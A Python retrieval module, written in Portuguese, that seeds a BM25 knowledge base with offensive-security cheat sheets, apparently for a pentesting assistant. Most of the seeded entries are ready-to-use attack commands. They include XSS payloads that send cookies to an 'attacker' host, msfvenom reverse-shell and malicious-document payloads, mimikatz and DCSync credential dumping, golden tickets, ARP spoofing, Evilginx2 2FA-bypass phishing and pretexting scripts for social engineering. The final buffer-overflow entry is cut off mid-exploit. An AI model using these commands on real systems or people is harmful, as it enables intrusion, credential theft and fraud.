import fcntl
import json
import logging
import math
import os
import re
from collections import Counter

DB_PATH = os.path.join(os.path.dirname(__file__), "knowledge_base.json")

# Score mínimo para incluir um documento — evita resultados irrelevantes com match residual
_MIN_SCORE = 0.1

# Stop words PT + EN — não contribuem para relevância
_STOP_WORDS = {
    "a", "o", "e", "de", "da", "do", "em", "um", "uma", "para", "com", "por",
    "que", "se", "na", "no", "ao", "os", "as", "dos", "das", "mais", "mas",
    "ou", "nem", "já", "não", "sim", "esta", "este", "isso", "isto", "aqui",
    "como", "quando", "onde", "qual", "quais", "seu", "sua", "seus", "suas",
    "the", "a", "an", "and", "or", "in", "on", "at", "to", "for", "of",
    "is", "are", "was", "with", "this", "that", "it", "be", "by", "from",
    "as", "not", "but", "if", "we", "you", "can", "will", "are", "has",
}

# Expansão semântica: termos de segurança com sinónimos/aliases
_SYNONYMS: dict[str, list[str]] = {
    "scan": ["nmap", "scanning", "varredura", "recon"],
    "scanning": ["nmap", "scan", "varredura"],
    "varredura": ["nmap", "scan", "scanning"],
    "injecao": ["injection", "sqli", "sqlmap", "sql"],
    "injection": ["sqli", "sqlmap", "injecao", "sql"],
    "sqli": ["injection", "sqlmap", "injecao", "sql"],
    "xss": ["cross-site", "scripting", "reflected", "stored"],
    "overflow": ["buffer", "bof", "stack", "heap", "exploit"],
    "privesc": ["privilege", "escalation", "escalacao", "root", "sudo"],
    "escalacao": ["privesc", "privilege", "escalation", "root"],
    "brute": ["force", "brute-force", "gobuster", "ffuf", "wordlist"],
    "fuzzing": ["ffuf", "fuzz", "gobuster", "brute", "wordlist"],
    "phishing": ["social", "engineering", "engenharia", "email"],
    "ia": ["inteligencia", "artificial", "ai", "llm", "machine", "learning"],
    "ai": ["ia", "inteligencia", "artificial", "llm", "machine", "learning"],
    "llm": ["gpt", "claude", "ia", "ai", "modelo", "language"],
}


def _load() -> list[dict]:
    if not os.path.exists(DB_PATH):
        return []
    try:
        with open(DB_PATH, "r", encoding="utf-8") as f:
            fcntl.flock(f.fileno(), fcntl.LOCK_SH)
            try:
                return json.load(f)
            finally:
                fcntl.flock(f.fileno(), fcntl.LOCK_UN)
    except Exception as e:
        logging.error(f"rag._load falhou: {e}")
        return []


def _save(docs: list[dict]):
    try:
        with open(DB_PATH, "w", encoding="utf-8") as f:
            fcntl.flock(f.fileno(), fcntl.LOCK_EX)
            try:
                json.dump(docs, f, ensure_ascii=False, indent=2)
            finally:
                fcntl.flock(f.fileno(), fcntl.LOCK_UN)
    except Exception as e:
        logging.error(f"rag._save falhou: {e}")


def _tokenize(text: str) -> list[str]:
    tokens = re.findall(r"[a-záàâãéêíóôõúüçA-ZÁÀÂÃÉÊÍÓÔÕÚÜÇ0-9_-]+", text.lower())
    return [t for t in tokens if t not in _STOP_WORDS]


def _expand_query(tokens: list[str]) -> set[str]:
    """Expande tokens com sinónimos para melhorar recall."""
    expanded = set(tokens)
    for t in tokens:
        for syn in _SYNONYMS.get(t, []):
            expanded.add(syn)
    return expanded


def _bm25_scores(query: str, docs: list[dict]) -> list[tuple[float, str]]:
    K1 = 1.5
    B = 0.75

    corpus = [_tokenize(d["content"]) for d in docs]
    raw_tokens = _tokenize(query)
    query_tokens = _expand_query(raw_tokens)

    if not query_tokens:
        return []

    n = len(corpus)
    avgdl = sum(len(t) for t in corpus) / n if n else 1

    idf: dict[str, float] = {}
    for term in query_tokens:
        df = sum(1 for tokens in corpus if term in tokens)
        idf[term] = math.log((n - df + 0.5) / (df + 0.5) + 1)

    scored = []
    for i, tokens in enumerate(corpus):
        tf = Counter(tokens)
        dl = len(tokens) or 1
        score = 0.0
        for term in query_tokens:
            freq = tf[term]
            numerator = freq * (K1 + 1)
            denominator = freq + K1 * (1 - B + B * dl / avgdl)
            score += idf.get(term, 0) * (numerator / denominator)

        # boost: termos nos primeiros 300 chars (título/cabeçalho) valem 1.5x
        header = _tokenize(docs[i]["content"][:300])
        header_hits = sum(1 for t in query_tokens if t in header)
        if header_hits:
            score *= 1.0 + 0.5 * (header_hits / len(query_tokens))

        if score >= _MIN_SCORE:
            scored.append((score, docs[i]["content"]))

    scored.sort(reverse=True)
    return scored


def add_document(doc_id: str, content: str, metadata: dict = None):
    docs = _load()
    docs = [d for d in docs if d["id"] != doc_id]
    docs.append({"id": doc_id, "content": content, "metadata": metadata or {}})
    _save(docs)


def search_knowledge(query: str, n_results: int = 3) -> str:
    docs = _load()
    if not docs:
        return ""
    scored = _bm25_scores(query, docs)
    top = [content for _, content in scored[:n_results]]
    return "\n\n".join(top)


def list_documents() -> list[dict]:
    """Retorna lista de {id, preview, size} para todos os documentos."""
    docs = _load()
    result = []
    for d in docs:
        content = d.get("content", "")
        first_line = content.split("\n")[0].strip("#").strip()[:60]
        result.append({
            "id": d["id"],
            "preview": first_line,
            "size": len(content),
        })
    return result


def remove_document(doc_id: str) -> bool:
    """Remove documento por ID. Retorna True se encontrado e removido."""
    docs = _load()
    filtered = [d for d in docs if d["id"] != doc_id]
    if len(filtered) == len(docs):
        return False
    _save(filtered)
    return True


def get_stats() -> dict:
    return {"total_docs": len(_load())}


INITIAL_KB = [
    ("nmap_basics", """Nmap - Comandos essenciais:
nmap -sV -sC -p- target          # scan completo com scripts e versões
nmap -sU --top-ports 100 target  # UDP scan
nmap -A -T4 target               # agressivo com OS detection
nmap --script vuln target        # scan de vulnerabilidades
nmap -sn 192.168.1.0/24         # host discovery (ping sweep)""", {"category": "tools"}),

    ("sqlmap_basics", """SQLMap - Injeção SQL automatizada:
sqlmap -u "http://site.com/page?id=1" --dbs          # listar bases de dados
sqlmap -u "url" -D dbname --tables                   # listar tabelas
sqlmap -u "url" -D dbname -T users --dump            # extrair dados
sqlmap -r request.txt --level=5 --risk=3             # a partir de ficheiro burp
sqlmap -u "url" --os-shell                           # shell no servidor (se possível)""", {"category": "tools"}),

    ("burpsuite_tips", """Burp Suite - Dicas:
- Intercept: captura requests HTTP/HTTPS
- Repeater: modifica e reenvia requests manualmente
- Intruder: brute force e fuzzing automatizado
- Scanner (Pro): scan de vulnerabilidades web
- Decoder: encode/decode base64, URL, hex, etc.
Configurar proxy: 127.0.0.1:8080 no browser""", {"category": "tools"}),

    ("owasp_top10", """OWASP Top 10 (2021):
A01 - Broken Access Control
A02 - Cryptographic Failures
A03 - Injection (SQLi, XSS, etc.)
A04 - Insecure Design
A05 - Security Misconfiguration
A06 - Vulnerable Components
A07 - Auth Failures
A08 - Software & Data Integrity Failures
A09 - Security Logging Failures
A10 - SSRF""", {"category": "theory"}),

    ("linux_privesc", """Linux Privilege Escalation:
sudo -l                          # verificar sudo permissions
find / -perm -4000 2>/dev/null  # binários SUID
crontab -l && cat /etc/crontab  # cron jobs
ps aux | grep root               # processos root
linpeas.sh                       # script automático de enum
GTFOBins: https://gtfobins.github.io/""", {"category": "techniques"}),

    ("web_recon", """Reconhecimento Web:
gobuster dir -u http://target -w /wordlist.txt    # directory bruteforce
ffuf -w wordlist.txt -u http://target/FUZZ        # fuzzing rápido
nikto -h http://target                             # scan básico de vulns
whatweb http://target                              # fingerprint tecnologias""", {"category": "recon"}),

    ("reverse_engineering", """Engenharia Reversa - Ferramentas:
Ghidra:
  - Abrir binário: File > Import File
  - Auto-análise: Analysis > Auto Analyze
  - Decompiler integrado mostra C pseudo-código
  - Renomear funções/variáveis para facilitar análise

Radare2:
  r2 binary               # abrir binário
  aaa                     # análise completa
  afl                     # listar funções
  pdf @ main              # disassembly da função main
  iz                      # listar strings
  VV                      # modo visual graph

GDB + PEDA/pwndbg:
  gdb ./binary
  r                       # run
  b *0x401234             # breakpoint em endereço
  ni / si                 # next/step instruction
  x/20x $rsp             # examinar stack
  info registers          # ver registos
  pattern create 200      # criar padrão para offset
  checksec                # ver proteções (ASLR, NX, PIE, canary)""", {"category": "reverse"}),

    ("web_exploits", """Exploits Web Avançados:
XSS (Cross-Site Scripting):
  <script>document.location='http://attacker/steal?c='+document.cookie</script>
  <img src=x onerror=fetch('//attacker/'+btoa(document.cookie))>
  Bypass filtros: <ScRiPt>, "><svg onload=alert(1)>, javascript:alert(1)
  Stored XSS → persistente na BD; Reflected → no URL; DOM → no JS

SSRF (Server-Side Request Forgery):
  http://localhost/admin
  http://169.254.169.254/latest/meta-data/  # AWS metadata
  http://[::1]/admin                         # IPv6 bypass
  file:///etc/passwd                         # LFI via SSRF
  Ferramentas: Burp Collaborator, interactsh

XXE (XML External Entity):
  <?xml version="1.0"?>
  <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>
  Blind XXE: exfiltrar via DNS/HTTP para servidor externo

IDOR (Insecure Direct Object Reference):
  /api/user/1337 → tentar /api/user/1, /api/user/2
  Mudar IDs em cookies, headers, body JSON
  Testar GUIDs previsíveis ou sequenciais
  Combinar com mass assignment""", {"category": "web"}),

    ("networking_attacks", """Redes - Ferramentas e Ataques:
Wireshark:
  Filtros úteis:
  http.request.method == "POST"    # ver POSTs
  tcp.port == 4444                 # porta específica
  ip.addr == 192.168.1.1          # por IP
  dns                              # só DNS
  follow TCP stream → clic direito no pacote

Tcpdump:
  tcpdump -i eth0 -w capture.pcap          # capturar tudo
  tcpdump -i eth0 port 80 -A               # HTTP em ASCII
  tcpdump -i eth0 host 192.168.1.1        # filtrar IP
  tcpdump -r capture.pcap                  # ler ficheiro

ARP Spoofing (MITM):
  arpspoof -i eth0 -t <victim> <gateway>   # envenenar vítima
  arpspoof -i eth0 -t <gateway> <victim>   # envenenar gateway
  echo 1 > /proc/sys/net/ipv4/ip_forward  # ativar forwarding
  bettercap -iface eth0                    # alternativa moderna
  Capturar tráfego com wireshark após MITM""", {"category": "network"}),

    ("ctf_tips", """CTF Tips & Tricks:
Esteganografia:
  steghide extract -sf image.jpg          # extrair dados escondidos
  binwalk -e file                         # extrair ficheiros embutidos
  strings file | grep flag                # strings legíveis
  exiftool image.jpg                      # metadata
  zsteg image.png                         # LSB stego em PNG
  stegsolve.jar                           # análise visual de planos de bits

Criptografia:
  CyberChef (browser) - swiss army knife de crypto
  hashcat -m 0 hash.txt wordlist.txt      # crack MD5
  john --wordlist=rockyou.txt shadow      # crack passwords
  openssl enc -d -aes-256-cbc -in f.enc  # decrypt AES
  RSA fraco: usar RsaCtfTool
  Caesar/Vigenere: dcode.fr

Forensics:
  volatility -f memory.dmp imageinfo      # análise de memória RAM
  foremost -i disk.img -o output/        # recuperar ficheiros
  autopsy                                 # GUI forense
  file unknown_file                       # identificar tipo
  hexdump -C file | head                 # ver magic bytes
  photorec disk.img                      # recuperar fotos/docs""", {"category": "ctf"}),

    ("wordlists", """Wordlists para Pentesting:
Localizações comuns (Kali/Parrot):
  /usr/share/wordlists/rockyou.txt        # 14M passwords
  /usr/share/seclists/                    # coleção enorme
  /usr/share/wordlists/dirbuster/        # directory busting

SecLists (recomendado instalar):
  git clone https://github.com/danielmiessler/SecLists
  Passwords/Common-Credentials/top-passwords-shortlist.txt
  Discovery/Web-Content/common.txt        # dirs comuns
  Fuzzing/SQLi/                          # payloads SQLi
  Usernames/Names/names.txt              # usernames

Crunch (gerar wordlists custom):
  crunch 8 8 0123456789 -o nums.txt      # 8 dígitos numéricos
  crunch 6 10 abc123 -o custom.txt       # chars específicos
  crunch 8 8 -t @@@@1234                 # padrão fixo

Hashcat regras para mutações:
  hashcat -r rules/best64.rule hash.txt rockyou.txt""", {"category": "wordlists"}),

    ("metasploit", """Metasploit Framework - Guia Completo:
Iniciar:
  msfconsole                              # abrir consola
  msfdb init                             # inicializar base de dados

Comandos essenciais:
  search eternalblue                     # procurar módulos
  use exploit/windows/smb/ms17_010_eternalblue
  info                                   # info sobre o módulo
  show options                           # ver opções necessárias
  set RHOSTS 192.168.1.10               # definir alvo
  set LHOST 192.168.1.100               # teu IP
  set LPORT 4444                        # porta de escuta
  run / exploit                          # executar

Payloads com msfvenom:
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell
  msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f aspx -o shell.aspx
  msfvenom --list payloads                # listar todos os payloads

Meterpreter (pós-exploração):
  sysinfo                                # info do sistema
  getuid                                 # utilizador atual
  getsystem                             # tentar elevar para SYSTEM
  hashdump                              # extrair hashes de passwords
  upload / download                      # transferir ficheiros
  shell                                  # shell nativa
  migrate <PID>                         # migrar para outro processo
  keyscan_start / keyscan_dump          # keylogger
  screenshot                            # capturar ecrã
  run post/multi/recon/local_exploit_suggester  # sugerir privesc
  background                            # colocar sessão em background
  sessions -l / sessions -i 1          # gerir sessões

Handler manual:
  use exploit/multi/handler
  set payload windows/x64/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT 4444
  run -j                                # correr em background""", {"category": "tools"}),

    ("windows_privesc", """Windows Privilege Escalation:
Enumeração inicial:
  whoami /all                            # utilizador e privilégios
  net user && net localgroup administrators
  systeminfo                             # OS, patches instalados
  wmic qfe list brief                   # hotfixes/patches
  tasklist /svc                         # processos e serviços

Scripts automáticos:
  winPEAS.exe                           # enumeração completa
  PowerUp.ps1 (PowerSploit)            # vulnerabilidades comuns
  Seatbelt.exe                          # checks de segurança
  SharpUp.exe                           # privesc rápido

Técnicas comuns:
  # Serviços com permissões fracas
  sc qc <ServiceName>
  accesschk.exe -ucqv <ServiceName>
  sc config <ServiceName> binpath= "cmd /c net localgroup administrators user /add"

  # AlwaysInstallElevated (MSI como SYSTEM)
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o evil.msi
  msiexec /quiet /qn /i evil.msi

  # Unquoted Service Path
  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

  # DLL Hijacking
  procmon.exe → filtrar por "NAME NOT FOUND" em DLLs
  colocar DLL maliciosa no path encontrado

Token Impersonation:
  whoami /priv                          # verificar SeImpersonatePrivilege
  PrintSpoofer.exe -i -c cmd           # se SeImpersonatePrivilege ativo
  JuicyPotato / RoguePotato / GodPotato

Credenciais guardadas:
  cmdkey /list                          # credenciais guardadas
  reg query HKLM /f password /t REG_SZ /s
  findstr /si password *.txt *.xml *.ini *.config
  mimikatz: sekurlsa::logonpasswords   # dump de credenciais em memória
  mimikatz: lsadump::sam               # hashes locais

Pass-the-Hash:
  evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
  psexec.py domain/user@IP -hashes :NTLM_HASH""", {"category": "techniques"}),

    ("active_directory", """Active Directory - Ataque e Enumeração:

## Enumeração Inicial
  # Com credenciais válidas
  bloodhound-python -u user -p pass -d domain.local -ns <DC_IP> -c All
  ldapdomaindump -u 'domain\\user' -p pass <DC_IP>
  enum4linux-ng -A <DC_IP>

  # Sem credenciais (null session / anonymous)
  nmap -p 389 --script ldap-rootdse <DC_IP>
  crackmapexec smb <IP_RANGE> --gen-relay-list relay_targets.txt

## BloodHound
  # Instalar
  pip install bloodhound
  # Correr collector
  bloodhound-python -u user -p pass -d domain.local -ns <DC_IP> -c All
  # Abrir BloodHound GUI → importar JSON gerado
  # Queries úteis:
  # "Shortest Path to Domain Admin"
  # "Find All Domain Admins"
  # "Find Principals with DCSync Rights"

## Kerberoasting (obter TGS para crack offline)
  # Impacket
  GetUserSPNs.py domain.local/user:pass -dc-ip <DC_IP> -request
  # CrackMapExec
  crackmapexec ldap <DC_IP> -u user -p pass --kerberoasting hashes.txt
  # Crack
  hashcat -m 13100 hashes.txt rockyou.txt

## AS-REP Roasting (utilizadores sem pre-auth Kerberos)
  GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip <DC_IP> -no-pass
  hashcat -m 18200 asrep_hashes.txt rockyou.txt

## Pass-the-Ticket
  # Dump tickets
  mimikatz: sekurlsa::tickets /export
  # Importar ticket
  mimikatz: kerberos::ptt ticket.kirbi
  # Usar com impacket
  export KRB5CCNAME=ticket.ccache
  psexec.py -k -no-pass domain.local/user@target

## DCSync (dump de hashes do domínio inteiro)
  # Requer: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
  secretsdump.py domain.local/user:pass@<DC_IP>
  mimikatz: lsadump::dcsync /domain:domain.local /user:Administrator

## Pass-the-Hash com credenciais de domínio
  crackmapexec smb <IP_RANGE> -u Administrator -H <NTLM_HASH>
  evil-winrm -i <DC_IP> -u Administrator -H <NTLM_HASH>
  wmiexec.py domain.local/Administrator@<IP> -hashes :<NTLM>

## Golden Ticket (persistência total no domínio)
  # Precisas: hash NTLM do krbtgt + Domain SID
  mimikatz: lsadump::dcsync /user:krbtgt
  mimikatz: kerberos::golden /user:Administrator /domain:domain.local /sid:<SID> /krbtgt:<HASH> /ptt

## LDAP Attacks
  # LDAP signing não enforced → relay NTLM
  responder -I eth0 -dwv
  ntlmrelayx.py -tf relay_targets.txt -smb2support -l loot/

## Ferramentas Essenciais AD
  Impacket suite    → secretsdump, psexec, wmiexec, GetUserSPNs
  BloodHound        → mapeamento gráfico de ataques
  CrackMapExec      → swiss army knife para AD
  Responder         → envenenamento LLMNR/NBT-NS
  evil-winrm        → shell WinRM com Pass-the-Hash
  PowerView.ps1     → enumeração AD via PowerShell""", {"category": "active_directory"}),

    ("osint", """OSINT - Open Source Intelligence:

## Reconhecimento de Domínios e IPs
  whois domain.com                          # info de registo do domínio
  nslookup / dig domain.com ANY            # registos DNS
  dig axfr @ns1.domain.com domain.com     # tentativa de zone transfer
  sublist3r -d domain.com                  # subdomain enumeration
  amass enum -d domain.com                 # subdomain + ASN info
  theHarvester -d domain.com -b all        # emails, subdomains, IPs
  shodan search hostname:domain.com        # dispositivos expostos
  censys.io / shodan.io                    # motores de busca de IPs/serviços

## Google Dorks (Google Hacking)
  site:domain.com filetype:pdf             # ficheiros PDF no domínio
  site:domain.com inurl:admin              # painéis de admin
  site:domain.com intext:"password"        # passwords expostas
  intitle:"index of" site:domain.com      # directory listing
  site:domain.com ext:sql OR ext:bak      # backups expostos
  "domain.com" filetype:xls               # ficheiros Excel
  inurl:"/wp-content/uploads/" site:target  # uploads WordPress
  cache:domain.com                         # cache do Google

## Emails e Pessoas
  hunter.io                                # emails por domínio
  phonebook.cz                             # emails, subdomínios, URLs
  haveibeenpwned.com                       # breaches de email
  dehashed.com                             # credenciais em leaks
  theHarvester -d domain.com -b linkedin   # perfis LinkedIn

## Redes Sociais e Usernames
  sherlock <username>                      # username em 300+ sites
  maigret <username>                       # alternativa ao sherlock
  socialscan <username>                    # verificar disponibilidade

## Metadados de Ficheiros
  exiftool document.pdf                    # metadata (autor, GPS, SW)
  metagoofil -d domain.com -t pdf,doc -o output/  # download + análise

## Breaches e Leaks
  # Bases de dados de leaks
  haveibeenpwned.com/API                   # verificar emails
  dehashed.com                             # credenciais vazadas
  intelx.io                                # motor de busca de leaks
  # Procurar credenciais no GitHub
  site:github.com "domain.com" password
  site:github.com "domain.com" api_key

## Wayback Machine e Histórico Web
  curl "http://archive.org/wayback/available?url=domain.com"
  waybackurls domain.com                   # todos os URLs históricos
  gau domain.com                           # GetAllUrls (gau)
  # Procurar ficheiros antigos expostos e endpoints removidos

## Shodan Dorks
  org:"Company Name"                       # todos os IPs da empresa
  hostname:domain.com port:22             # SSH exposto
  ssl:domain.com                          # certificados SSL
  http.title:"Admin Panel" org:"Company" # painéis de admin expostos
  vuln:CVE-2021-44228                     # hosts vulneráveis a Log4Shell

## Ferramentas Framework OSINT
  Maltego          → mapeamento visual de relações
  SpiderFoot       → automação de OSINT (200+ módulos)
  Recon-ng         → framework modular tipo Metasploit para OSINT
  OSINT Framework  → osintframework.com (árvore de ferramentas)
  Mitaka           → extensão browser para IOC lookup""", {"category": "osint"}),

    ("mobile_hacking", """Mobile Hacking - Android & iOS:

## Setup do Ambiente Android
  adb devices                              # listar dispositivos conectados
  adb shell                                # shell no dispositivo
  adb install app.apk                      # instalar APK
  adb pull /data/data/com.app/ ./loot/    # extrair dados da app (root)
  adb logcat | grep -i password           # logs em tempo real

## Análise Estática de APK
  # Decompilar APK
  apktool d app.apk -o output/            # decompilar recursos + smali
  jadx-gui app.apk                        # decompila para Java legível
  # Procurar segredos no código
  grep -r "api_key\|password\|secret\|token" output/
  grep -r "http://" output/               # endpoints hardcoded
  # Analisar AndroidManifest.xml
  cat output/AndroidManifest.xml          # permissões, activities, exported

## Análise Dinâmica Android
  # Frida - hooking e instrumentação
  pip install frida-tools
  frida-ps -U                             # listar processos no dispositivo
  frida -U -f com.app.package -l script.js  # injectar script
  # Objection (wrapper do Frida)
  objection -g com.app.package explore
  android sslpinning disable              # bypass SSL pinning
  android root simulate                   # simular root
  memory dump all ./dump/                 # dump de memória

## SSL Pinning Bypass
  # Métodos comuns:
  # 1. Frida script (mais fiável)
  # 2. Objection: android sslpinning disable
  # 3. Patch no APK com apktool + recompilação
  # 4. Magisk + TrustUserCerts (Android rooted)
  # Configurar proxy Burp no dispositivo:
  adb shell settings put global http_proxy <IP>:8080

## MobSF (Mobile Security Framework)
  docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
  # Abre browser: http://localhost:8000
  # Upload APK → análise automática estática + dinâmica
  # Detecta: hardcoded secrets, insecure storage, exported components

## Vulnerabilidades Comuns Android
  # Exported Activities (acesso sem autenticação)
  adb shell am start -n com.app/.AdminActivity
  # Content Providers expostos
  adb shell content query --uri content://com.app.provider/users
  # Insecure Storage
  adb shell cat /data/data/com.app/shared_prefs/*.xml
  adb shell sqlite3 /data/data/com.app/databases/app.db ".dump"
  # Deep Links maliciosos
  adb shell am start -a android.intent.action.VIEW -d "app://evil_payload"

## iOS Pentest (dispositivo jailbroken)
  # Ferramentas via Cydia/Sileo:
  # Frida, objection, SSL Kill Switch 2, Filza
  ssh root@<iPhone_IP>                    # acesso SSH (pass: alpine)
  find / -name "*.plist" | xargs grep -l password  # plists com dados
  # Dump de keychain
  objection -g com.app explore
  ios keychain dump
  # Class-dump (análise de headers)
  class-dump -H app.decrypted -o headers/""", {"category": "mobile"}),

    ("cloud_aws", """Cloud Pentesting - AWS:

## Reconhecimento e Enumeração
  # Verificar se bucket S3 é público
  aws s3 ls s3://bucket-name --no-sign-request
  aws s3 cp s3://bucket-name/ ./loot/ --recursive --no-sign-request
  # Ferramentas de enum
  AWSBucketDump                            # enum buckets S3 públicos
  S3Scanner -bucket bucket-name           # scan de buckets

## Credenciais AWS Expostas
  # Procurar em repositórios públicos
  truffleHog3 --regex --entropy https://github.com/org/repo
  gitleaks detect --source . -v
  # Verificar se credenciais são válidas
  aws sts get-caller-identity --profile stolen
  # Localizar credenciais em instâncias EC2
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

## AWS CLI com Credenciais Comprometidas
  aws configure --profile victim           # configurar perfil
  aws sts get-caller-identity             # quem sou eu?
  aws iam get-user                        # info do utilizador
  aws iam list-attached-user-policies     # políticas attachadas
  aws iam list-user-policies              # políticas inline
  aws iam get-policy-version ...         # ver permissões exactas

## Enumeração de Serviços
  # EC2
  aws ec2 describe-instances              # listar instâncias
  aws ec2 describe-security-groups       # grupos de segurança
  # S3
  aws s3 ls                              # listar todos os buckets
  aws s3api get-bucket-acl --bucket name # ACL do bucket
  aws s3api get-bucket-policy --bucket name
  # IAM
  aws iam list-users
  aws iam list-roles
  aws iam list-groups
  # Lambda
  aws lambda list-functions
  aws lambda get-function --function-name name
  # RDS, Secrets Manager
  aws rds describe-db-instances
  aws secretsmanager list-secrets
  aws secretsmanager get-secret-value --secret-id name  # dump secrets

## Privilege Escalation em AWS IAM
  # Técnicas comuns:
  # 1. iam:CreatePolicyVersion → criar nova versão de política com Admin
  # 2. iam:AttachUserPolicy → attachar AdministratorAccess ao teu user
  # 3. iam:PassRole + lambda:CreateFunction → executar código como role privilegiada
  # 4. sts:AssumeRole → assumir role com mais permissões
  aws sts assume-role --role-arn arn:aws:iam::ID:role/Admin --role-session-name pwned

## Ferramentas Automáticas
  # Pacu (framework de pentest AWS, tipo Metasploit)
  pip install pacu
  pacu
  > import_keys --all
  > run iam__enum_permissions
  > run iam__privesc_scan

  # CloudMapper - mapeamento visual da infraestrutura
  # ScoutSuite - audit de segurança multi-cloud
  scout suite --provider aws --profile victim

## Misconfigurations Comuns AWS
  - Buckets S3 públicos com dados sensíveis
  - IMDSv1 activo → SSRF → credenciais de instância
  - Roles com permissões * (wildcard)
  - Security Groups com 0.0.0.0/0 em portas críticas
  - Secrets hardcoded em variáveis de ambiente Lambda
  - Snapshots EBS públicos com dados de produção
  - CloudTrail desactivado (sem logging de acções)""", {"category": "cloud"}),

    ("social_engineering", """Social Engineering - Engenharia Social:

## Phishing - Email
  # SET (Social Engineering Toolkit)
  setoolkit
  > 1 (Social-Engineering Attacks)
  > 2 (Website Attack Vectors)
  > 3 (Credential Harvester Attack)

  # GoPhish - framework profissional de phishing
  # Download: github.com/gophish/gophish
  ./gophish                                # inicia servidor (port 3333 admin, 80 phishing)
  # Criar campanha: landing page + email template + grupo de alvos

  # Técnicas de email spoofing
  # Verificar se domínio tem SPF/DKIM/DMARC fracos:
  dig TXT domain.com | grep spf
  dig TXT _dmarc.domain.com
  # Domínios similares (typosquatting):
  paypa1.com, g00gle.com, arnazon.com

## Phishing - Páginas Falsas
  # Clonar site legítimo
  wget -mk -nH http://target-site.com     # clonar site
  # Evilginx2 - proxy MITM para bypass de 2FA
  # Captura cookies de sessão mesmo com MFA activo
  evilginx2
  > phishlets hostname office365 evil.com
  > phishlets enable office365
  > lures create office365

## Pretexting - Criação de Pretextos
  Cenários comuns:
  - Suporte técnico a pedir credenciais ("sistema em manutenção")
  - RH a pedir confirmação de dados pessoais
  - Auditor externo a pedir acesso temporário
  - Fornecedor a enviar "factura urgente" com macro maliciosa
  - CEO Fraud: email falso do CEO a pedir transferência urgente

  Elementos de um bom pretexto:
  - Urgência (pressão de tempo elimina pensamento crítico)
  - Autoridade (quem envia importa tanto como o que envia)
  - Familiaridade (referencias a detalhes reais da empresa/pessoa)
  - Escassez (oferta limitada, acesso temporário, etc.)

## Vishing (Phishing por Voz)
  # Spoofing de número de telefone
  # Cenários: banco, suporte Microsoft, IT interno
  # OSINT antes da chamada: nome, departamento, projecto actual
  # Ferramentas: spoofcard, SpoofBox (serviços de spoofing)
  Técnica clássica: ligar como "IT support" a pedir que o alvo instale
  "ferramenta de diagnóstico" (RAT/backdoor)

## Payloads para SE
  # Macro maliciosa em Word/Excel (VBA)
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f vba
  # HTA (HTML Application)
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f hta-psh -o evil.hta
  # LNK malicioso (shortcut)
  # PDF com exploit embebido
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f pdf -o evil.pdf
  # USB Drop Attack: largar pendrives em zonas comuns

## Smishing (SMS Phishing)
  Mensagens falsas de: banco, CTT (encomenda retida), operadora, governo
  Link encurtado → página de phishing clonada
  # Ferramentas: Twilio API para envio em massa

## OSINT antes do Ataque SE
  LinkedIn: cargo, equipa, projecto, gestor directo
  Facebook/Instagram: hobbies, família, localização
  Twitter: opiniões, check-ins, eventos
  Glassdoor: ferramentas internas usadas na empresa
  Job listings: tecnologias usadas (VPN, antivírus, ERP)

## Defesa contra SE
  - Formação e simulações regulares de phishing
  - Verificação out-of-band para pedidos urgentes/financeiros
  - MFA em todos os serviços críticos
  - DMARC/DKIM/SPF configurados correctamente
  - Política de zero-trust: nunca assumir, sempre verificar""", {"category": "social_engineering"}),

    ("buffer_overflow", """Buffer Overflow & Exploit Development:

## Conceito Base
  Stack layout (x86, cresce para baixo):
  [buffer][saved EBP][saved EIP][args]
  Objectivo: sobrescrever EIP para redirigir execução

## Workflow Clássico (Stack BOF Windows/Linux)
  1. Fuzzing - encontrar o crash
  2. Encontrar offset exacto do EIP
  3. Confirmar controlo do EIP
  4. Encontrar bad characters
  5. Encontrar JMP ESP ou gadget equivalente
  6. Gerar shellcode
  7. Ajustar NOP sled + shellcode

## 1. Fuzzing com Python
  python3 -c "print('A' * 1000)" | nc target 9999
  # Ou script incremental:
  for i in range(100, 5000, 100):
      send(b'A' * i)      # quando crasha → tamanho aproximado

## 2. Encontrar Offset (EIP)
  # Gerar padrão único
  msf-pattern_create -l 2000
  # ou com pwndbg/peda:
  pattern create 2000
  # Após crash, valor do EIP:
  msf-pattern_offset -l 2000 -q <EIP_value>
  pattern offset <EIP_value>

## 3. Confirmar EIP
  payload = b'A' * offset + b'B' * 4 + b'C' * 200
  # EIP deve ser 42424242 (BBBB)

## 4. Bad Characters
  # Gerar todos os bytes \x01 a \xff
  badchars = b"".join(bytes([i]) for i in range(1, 256))
  payload = b'A' * offset + b'B' * 4 + badchars
  # Comparar memória em ESP com sequência esperada
  # \x00 é sempre bad char (null terminator)

## 5. JMP ESP / Gadgets
  # Immunity Debugger + Mona
  !mona jmp -r esp -cpb "\\x00"
  # ROPgadget
  ROPgadget --binary vuln --rop | grep "jmp esp"
  # objdump
  objdump -d vuln | grep -i "ff e4"    # ff e4 = jmp esp

## 6. Shellcode
  # Windows reverse shell (sem bad chars)
  msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f python -b "\\x00"
  # Linux reverse shell
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f python -b "\\x00"
  # Calcular espaço disponível em ESP antes de gerar

## 7. Exploit Final
  offset = 1337
